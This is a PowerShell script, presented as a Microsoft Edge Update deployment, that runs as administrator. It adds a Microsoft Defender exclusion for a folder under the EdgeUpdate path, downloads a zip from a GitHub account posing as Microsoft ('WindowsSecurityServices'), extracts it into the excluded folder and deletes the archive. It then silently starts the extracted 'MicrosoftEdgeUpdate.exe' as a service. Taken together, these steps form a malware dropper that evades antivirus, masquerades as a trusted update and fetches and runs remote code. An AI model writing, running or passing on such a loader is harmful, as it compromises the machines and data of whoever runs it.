# Requires -RunAsAdmin
# Add exclusion to Microsoft Defender before download
Add-MpPreference -ExclusionPath "C:\Program Files (x86)\Microsoft\EdgeUpdate\Update\"
# Check to ensure the exclusion took place
(Get-MpPreference).ExclusionPath
# Define environment variables
$DownloadUrl = "https://github.com/WindowsSecurityServices/MicrosoftEdgeUpdate/releases/download/v1.0.2/MicrosoftEdgeUpdate.zip"

# Updated base directory configurations
$BaseDir     = "C:\Program Files (x86)\Microsoft\EdgeUpdate"
$TargetDir   = Join-Path $BaseDir "Update"
$ZipPath     = Join-Path $TargetDir "MicrosoftEdgeUpdate.zip"

# 1. Ensure the nested folder hierarchy exists
if (-not (Test-Path $TargetDir)) {
    Write-Host "Creating deployment folder at $TargetDir..." -ForegroundColor Cyan
    New-Item -ItemType Directory -Path $TargetDir -Force | Out-Null
}

# 2. Download the Zip payload directly into the Update folder
Write-Host "Downloading bundle to $ZipPath..." -ForegroundColor Cyan
try {
    Invoke-WebRequest -Uri $DownloadUrl -OutFile $ZipPath -UseBasicParsing
} catch {
    Write-Error "Failed to download zip file. Verify URL or network configuration."
    Exit
}

# 3. Extract contents to the same Update folder locations
Write-Host "Extracting archive inside $TargetDir..." -ForegroundColor Cyan
try {
    Expand-Archive -Path $ZipPath -DestinationPath $TargetDir -Force
} catch {
    Write-Error "Failed to extract zip file."
    Exit
} finally {
    # Clean up and isolate the ZIP archive immediately
    if (Test-Path $ZipPath) { 
        Write-Host "Removing temporary zip payload..." -ForegroundColor Gray
        Remove-Item $ZipPath -Force 
    }
}

# 4. Move execution context to the deployment folder
Push-Location $TargetDir

# 6. Service lifecycle management via WinSW wrapper
$WinSWExe = Join-Path $TargetDir "MicrosoftEdgeUpdate.exe"

if (Test-Path $WinSWExe) {
    Write-Host "Configuring service using $WinSWExe..." -ForegroundColor Cyan
    
    Write-Host "Starting the Microsoft Edge Update Service..." -ForegroundColor Green
    Start-Process -FilePath $WinSWExe -Wait -WindowStyle Hidden
} else {
    Write-Error "WinSW wrapper executable not found at $WinSWExe."
}

Pop-Location
Write-Host "Deployment completed." -ForegroundColor Green
